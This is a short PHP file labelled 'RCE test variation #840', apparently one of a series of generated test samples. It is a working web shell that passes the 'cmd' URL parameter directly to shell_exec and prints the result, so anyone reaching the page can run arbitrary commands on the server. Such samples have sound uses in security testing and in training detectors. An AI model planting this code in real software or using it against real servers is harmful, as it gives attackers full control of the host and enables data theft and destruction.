<?php
// RCE test variation #840
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>